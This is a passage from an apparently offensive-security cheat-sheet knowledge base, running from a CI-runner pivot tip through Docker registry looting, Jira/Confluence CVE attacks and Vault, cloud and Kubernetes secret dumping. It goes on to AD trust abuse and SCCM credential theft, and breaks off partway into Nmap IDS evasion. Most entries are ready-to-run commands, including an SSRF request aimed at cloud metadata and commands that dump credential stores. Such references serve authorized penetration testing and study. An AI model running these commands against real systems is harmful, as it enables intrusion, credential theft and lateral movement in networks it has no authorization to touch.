- A runner usually can reach prod/internal nets the attacker can't -> pivot from it.
- See **jenkins-exploitation**, **gitlab-exploitation**, **git-repo-forensics**.

entries.title: Docker image & registry analysis
entries.brief: Pull images from exposed registries and mine their layers for secrets and source
entries.body:
## Exposed registry (5000/tcp)
    curl -s http://t:5000/v2/_catalog                 # list repositories
    curl -s http://t:5000/v2/<repo>/tags/list         # tags
    # (see docker-registry-enum if present)

## Pull an image
    docker pull t:5000/<repo>:<tag>                    # if the daemon trusts it (insecure-registries)
    # or grab manifests/blobs directly over the HTTP API and reassemble

## Mine the layers (the real loot)
    dive <image>            # browse each layer's filesystem changes (atlas: dive if present)
    docker history --no-trunc <image>   # build commands (hardcoded secrets in RUN/ENV!)
    docker save <image> -o img.tar ; tar xf img.tar   # then grep every layer:
    rg -i 'password|secret|api[_-]?key|BEGIN.*PRIVATE KEY' extracted/

## What you find
    hardcoded creds/tokens in ENV and RUN layers, .env/config files, private keys,
    application SOURCE CODE (read it for vulns), and base-image CVEs.

## Gotchas
- A secret 'removed' in a later layer still exists in an EARLIER layer — check every layer.
- `docker history` exposes build-time ENV/ARG secrets even if not in the final filesystem.
- Scan layers with trivy/grype for known CVEs too. See **git-repo-forensics** for the same idea in VCS.

entries.title: Atlassian Jira / Confluence vulnerabilities
entries.brief: Fingerprint the version and hit the well-known Jira/Confluence CVEs
entries.body:
## Fingerprint
    curl -s http://t:8080/rest/api/2/serverInfo        # Jira version (JSON)
    curl -s http://t/secure/Dashboard.jspa ; whatweb http://t
    searchsploit jira ; searchsploit confluence

## Jira — common issues
    # CVE-2019-8451: SSRF via /plugins/servlet/gadgets/makeRequest
    curl 'http://t/plugins/servlet/gadgets/makeRequest?url=http://169.254.169.254@t' -H 'X-Atlassian-Token: no-check'
    # CVE-2019-11581: template-injection RCE (contact-admin form) on some versions
    # user enum: /rest/api/2/user/picker, /ViewUserHover.jspa ; unauth dashboards leaking info

## Confluence — the big RCEs (see also confluence-ognl-rce)
    # CVE-2022-26134: unauth OGNL injection RCE via a crafted URL path
    # CVE-2021-26084: OGNL injection in the questions/widget endpoint
    # CVE-2023-22515/22518: broken access control / improper auth (admin takeover)

## Gotchas
- Always pull the exact version first (serverInfo) and match the CVE — these are version-specific.
- Atlassian endpoints need `X-Atlassian-Token: no-check` to bypass XSRF on some requests.
- SSRF (CVE-2019-8451) -> cloud metadata / internal services (see cloud-metadata-ssrf).

entries.title: Secrets-store looting — Vault, SOPS, cloud param stores
entries.brief: Where modern apps keep secrets, and how to read them once you have a shell/token
entries.body:
## HashiCorp Vault
    # find a token: env (VAULT_TOKEN), ~/.vault-token, app configs, k8s SA
    export VAULT_ADDR=http://127.0.0.1:8200 VAULT_TOKEN=<token>
    vault token lookup ; vault secrets list ; vault kv list secret/
    vault kv get secret/path            # read a secret (atlas: vault)

## SOPS-encrypted files (.sops.yaml / enc.yaml)
    # if you can reach the KMS/age/PGP key (often the box's own cloud role or a local age key):
    sops -d secrets.enc.yaml            # decrypts in place (atlas: sops)
    find / -name '*.sops.*' -o -name '*enc.yaml' 2>/dev/null

## Cloud parameter/secret stores (with creds/role)
    aws secretsmanager list-secrets ; aws secretsmanager get-secret-value --secret-id X
    aws ssm get-parameters-by-path --path / --with-decryption
    az keyvault secret list/show ; gcloud secrets versions access latest --secret=X

## Kubernetes
    kubectl get secrets -A -o yaml      # base64 -d the values (see kubernetes-pentest)

## Gotchas
- A Vault token's power = its policies; `token lookup` first to see what you can read.
- SOPS needs the decryption key — often the host's OWN cloud role/age key is enough.
- These stores centralise the whole env's secrets -> top-tier loot. See credential-reuse-strategy.

entries.title: AD trusts & forest enumeration
entries.brief: Map domain/forest trusts and understand which ones enable cross-domain movement
entries.body:
## Why trusts matter
A trust lets principals in one domain authenticate to another. After owning one domain, trusts are
the road to sibling/parent domains and other forests — so always enumerate them.

## Enumerate trusts
    nxc ldap DC -u user -p pass -M enum_trusts
    impacket-findDelegation / PowerView: Get-DomainTrust ; Get-NetForestTrust
    # BloodHound shows trust edges + direction

## Trust types & direction (what's usable)
    - parent<->child (intra-forest): automatic, two-way, transitive -> child DA can often reach forest root
    - tree-root / cross-forest: may be one-way or non-transitive; check direction + SID filtering
    - 'inbound' to you = they trust YOUR domain (you can auth to them)

## Cross using a trust
    # with creds valid in the trusting domain:
    nxc smb other-dc.otherdom.local -u 'OTHERDOM\user' -p pass
    impacket-getST ... -spn cifs/target@otherdom.local   # Kerberos across the trust
    # intra-forest child->parent escalation uses the trust key / SID history (reference-level)

## Gotchas
- SID filtering on cross-forest trusts blocks many classic abuses; intra-forest usually doesn't.
- Enumerate the FOREST, not just your domain — the goal host may be a sibling domain.
- See **kerberos-attacks-map**, **dcsync**; atlas **bloodhound**/**windapsearch**.

entries.title: SCCM / MECM attacks
entries.brief: Loot Network Access Account creds and abuse SCCM for credentials and deployment
entries.body:
## What SCCM is
Microsoft Configuration Manager (SCCM/MECM) manages and deploys software to endpoints. It stores
credentials (Network Access Accounts) and can push code to clients — a high-value AD target.

## Find it
    # SCCM clients/servers; the management point (MP) + distribution points
    nxc smb TARGETS -M sccm        # locate SCCM roles
    # LDAP: System Management container, MP service records

## Common wins
    - NAA credential recovery: decrypt Network Access Account creds from client policy/WMI/DPAPI
      (SharpSCCM / sccmhunter) -> reusable domain creds
    - PXE boot media: unauthenticated PXE can leak a password-protected boot image you can crack
    - Credential harvesting from the SCCM DB / site server if you reach it
    - Application deployment: with the right role, push a 'software' package = code exec on clients

## Tooling
    sccmhunter (find/profile/loot) ; SharpSCCM (NAA creds, client push) ; PXEThief (PXE media)

## Gotchas
- NAA creds are frequently over-privileged and reused -> straight to lateral movement.
- Client push settings can be abused to coerce/relay the site server's auth.
- Reference-level: match tooling to the SCCM role you can reach. See **credential-reuse-strategy**.

entries.title: Nmap firewall/IDS evasion & tuning
entries.brief: Scan through filtering: timing, fragmentation, decoys, source port and scan-type tricks
entries.body:
## First, pick the right scan type
    nmap -sS   # SYN (stealthy, default as root)
    nmap -sT   # full connect (no raw sockets, e.g. through proxychains)
    nmap -sU   # UDP (slow but finds SNMP/TFTP/IKE/NTP)
    nmap -Pn   # skip host discovery when ICMP is filtered (treat as up)

## Evasion options
    -f / --mtu 16      # fragment packets to slip simple filters
